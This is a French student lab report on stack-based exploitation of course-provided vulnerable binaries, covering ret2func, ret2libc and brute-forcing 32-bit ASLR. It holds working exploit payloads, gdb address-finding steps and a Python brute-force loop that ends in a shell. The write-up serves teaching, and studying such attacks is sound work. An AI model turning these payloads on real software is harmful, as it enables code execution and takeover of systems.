# TP OS430 N°2 - Exploitation Logicielle
~ROUGÉ~ ~Jean~ ~|~ ~SONKO~ ~Mohamet~

## Exercice 2 - ’RET2FUNC FOR DUMMIES’

#### 1) Basic steps for 32-bit function call on stack </br></br>

En 32 bits le passage de paramètres ce fait à l'aide de la pile.
Les argument sont poussés sur la pile avant le call.
[Source](https://www.cs.princeton.edu/courses/archive/spr11/cos217/lectures/15AssemblyFunctions.pdf)

#### 2) What is PIE ?</br></br>

PIE veut dire *"Position Independent Executable"*.
[Source](https://www.redhat.com/en/blog/position-independent-executables-pie)

Un executable PIE est chargé à une position aléatoire de la mémoire virtuelle à chaque exécution. Cela rend les attaques de type ROP bien plus difficile à exécuter de maniére fiable.


#### 3) Explain the Return To Libc Method.</br></br>


La méthode **Return-to-Libc** est une méthode d'attaque qui, en partant d'un buffer overflow, aura pour but de remplacer l'adresse de retour dans la stack par l'adresse d'une autre fonction et de placer dans cette même stack les arguments de cette fonction.
On peut appeler plusieurs fonctions différentes mais le plus simple est d'appeler les fonctions de la ***libc*** car pas mal de fonctions utiles proviennent de cette librairie (au hasard : la fonction `system()` qui ne nécessite qu'un seul argument et qui exécute la commande système passée en argument).

#### 4) Find the overflow if it exists and give the padding.</br></br>

Toujours pareil : on copie une chaine de caractères avec strcpy() dans un buffer de taille limitée. 

Le paading est de 16 + 8 = 24.
16 pour le buffer et 8 pour deux mots contenant `$ebp` et le paramètre `buffer`.

#### 5) Use the buffer overflow to make the binary jumping into the function that validates the exercise (Note: the function MUST print its message). Write an exploit script in Python.</br></br>

Premièrement, nous avons pensé à modifier l'adresse de retour pour pointer directement sur le printf() (après le if).
Cette technique fonctionne mais nous avons eu vent que ce n'était pas la méthode attendue.

```python
print ("AAAAAAAAAAAAAAAA01234567\x02\x92\x04\x08")
```

Nous avons donc créé une nouvelle payload pour passer en paramètre un pointeur vers la chaine `valide` à la fonction `valide_ex` comme ça le programme fera `strcmp(valide,valide)` et on sera sur que la condition sera validée.

Pour choisr cette argument on utilise la méthode décrite dans ce [document](https://css.csail.mit.edu/6.858/2017/readings/return-to-libc.pdf)

| padding | &fonction | padding  | paramètre |
|------|------|------|------|
| A*24 | &validate_ex() | random word | &valide |
|"AAAA..."|0x080491b0|"BEEF"|0x804a00c|

On peut donc construire le script python ci-dessous qu'on passera en agrument à vuln.

```python
python -c "print 'A'*24 + '\xb0\x91\x04\x08' + 'BEEF' + '\x0c\xa0\x04\x08',"
```

## Exercice 3 - ’BASIC RET2LIBC’

#### 1. Is there an overflow ? If yes, why can’t we inject a shellcode into the vulnerable binary? Prove it with a command.</br></br>

L'overflow est toujours le même. 
Cependant on ne peut pas injecter notre shellcode dans la pile car le binaire n'a pas été compilé avec l'option `-z execstack`.
On ne pourra donc pas exécuter le code injecté en pile.

Pour le prouver on peut utiliser la fonction execstack ou bien readelf.

```bash
>$ readelf -a vuln | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
```
Ici on peut voir que la stack à les attributs RW (pour Read Write). Si elle était exécutable, on pourrait aussi voir l'attribut E (pour Execute).

```bash
>$ execstack -q vuln
- vuln
```
Un tiret indique que la pile n'est pas executable, alors qu'un X indique qu'elle l'est.

[Source](https://www.ibm.com/docs/en/linux-on-systems?topic=protection-control)

#### 2. Give the gdb commands that allow you to find the addresses of the LIBC functions youwill use to carry out your attack.</br></br>

Dans gdb après avoir lancé un programme (et donc chargé une table des symboles) on peut fair `p system` pour obtenir l'adresse de la fonction system().

#### 3. Explain the effects of the "-fno-stack-protector" and "-z execstack" compiler options.</br></br>

*Déjà demandé au TP précédent.*

`-fno-stack-protector` : L'option `fstack-protector` est une option qui permet de protéger les programmes des buffers overflow dans la stack en allouant une stack plus grande et en donnant une architecture qui permet une détection plus simple d'une anomalie. L'option `-fno-stack-protector` permet donc de la désactivé. Selon cette [source](https://stackoverflow.com/questions/10712972/what-is-the-use-of-fno-stack-protector), le stack protector serait normalement désactivé par défaut, sauf chez certaines distributions qui l'aurait activé par défaut.

`-z execstack` : mot-clé passé à l’éditeur de liens, défini sur l’exécutable, de sorte à ce que l’OS place la pile dans une page mémoire exécutable. Le comportement par défaut est de ne pas permettre d’exécuter d’instructions depuis la pile ([Info sur le flag](https://stackoverflow.com/questions/29178445/what-is-the-z-option-for-in-this-gcc-compiler-command) + [`man gcc`](https://linux.die.net/man/1/gcc))
 
#### 4. Exploit the flaw to make the binary opening a shell. Write an exploit script in Python.</br></br>

Première démarche, encore une fois, nous suivons la démarche de ce [document](https://css.csail.mit.edu/6.858/2017/readings/return-to-libc.pdf) pour faire appel à la fonction `system()` et exécuter `/bin/sh`.
Le principe est de modifier l'adresse de retour par un pointeur vers `system()`, et de mettre en paramètre la chaine `/bin/sh` que l'on trouvera dans la variable d'environnement `SHELL`

Premièrement on détermine que le padding est de 40.
Puis ensuite on obtient l'adresse de `system()` grâce à la commande `p system`
Finalement on obtient l'adresse de la variable `SHELL` en cherchant manuellement dans le résultat de la commande gdb `x/500s $esp`.
On trouve `0xffffdecb:	"SHELL=/bin/bash"`
On ajoute 6 pour garder uniquement la partie qui nous intéresse `0xffffded1:	"/bin/bash"`.

| padding | &fonction | padding  | paramètre |
|------|------|------|------|
| A*24 | &system() | random word | /bin/sh |
|"AAAA..."|0xf7e149e0 |"BEEF"|0x804a00c|

On obtient donc le payload suivant.

```python
python -c "print 'A'*40 + '\xe0\x49\xe1\xf7' + 'BEEF' + '\xd1\xde\xff\xff',"
```

Cependant cette méthode à un inconvénient, bien qu'elle fonctionne dans gdb, lorsqu'on exécute le programme en dehors, certainnes adresses de la stack vont changer, notamment l'adresse de la variable d'environnement `SHELL`.

Pour pallier à cela, nous allons utiliser une autre méthode.
Car on peut également trouver la chaine `/bin/sh` dans la libc. Obtenir cette addresse permettrait de résoudre notre problème précédent. 

Nous suivrons donc [cette méthode](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc).

Nous pouvons donc trouver la chaine `/bin/sh` facilement grace à cette commande gdb 
```
(gdb) find &system,+9999999,"/bin/sh"
0xf7f54aaa
warning: Unable to access 16000 bytes of target memory at 0xf7fb26b2, halting search.
1 pattern found.
```

Maintenant que nous avons notre adresse, nous pouvons  construire notre payload de cette manière.
![Payload](https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MXwAmlrjE8Ejl_0OQQX%2F-MY1FO9lURZfx9fTrAf0%2Fimage.png?alt=media&token=39659182-e3ff-4d34-a031-c7091567890a)

| padding | &fonction | addr retour  | paramètre |
|------|------|------|------|
|40*A | &system() | &exit() | &"bin/sh"(dans la libc) |
|"AAAA..." | 0xf7e149e0 | 0xf7e07a60 | 0xf7f54aaa

*A préciser que l'adresse d'exit n'est pas nécessaire, juste une manière propre de quitter après l'exécution de notre shell.*

Nous pouvons désormais injecter la payload suivante, qui fonctionne bien en dehors de gdb.
```python
`python -c "print 'A'*40 + '\xe0\x49\xe1\xf7' + '\x60\x7a\xe0\xf7' + '\xaa\x4a\xf5\xf7',"`
```



## Exercice 4 - 'Hardened Binary Cheating The ASLR'</br></br>

Une fois l'ASLR activé, la libc ne sera pas forcément au même endroit à chaque exécution.
Cependant l'ASLR en 32-bit est faible au bruteforce, car seulement 16bits sont randomisés.

On peut odnc injecter notre payload en boucle
jusqu'à ce qu'il soit valide.

Script python:
```python
#!/usr/bin/python
import subprocess
payload = 'A'*140 + '\xe0\x49\xe1\xf7' + '\x60\x7a\xe0\xf7' + '\xaa\x4a\xf5\xf7'
while(True):
    subprocess.call(['./vuln', payload])
```
Trace d'exécution:
```bash
userir@buster:~/Downloads/TP2-TD4/Hardened_Binary_Cheating_The_ASLR$ ./solv.py 
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
*** stack smashing detected ***: <unknown> terminated
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
Dumping Binary
Redirect Me if you can !
$ ls
asmdump  echo  file  Makefile  out  solv.py  vuln
$ 
```
----

Code plus générique pour la construction d'une payload:

```python
#!/usr/bin/python
import struct
import subprocess

base=0xf7e07a60
while(True):
    exit=base+0
    system=base+53120
    binsh=base+1364042

    padding = 'A'*140
    system_code = struct.pack('I',system)
    exit_code   = struct.pack('I',exit)
    binsh_code  = struct.pack('I',binsh)

    payload = padding + system_code + exit_code + binsh_code

    # print padding + system_code + exit_code + binsh_code

    subprocess.call(['./vuln', payload])
```







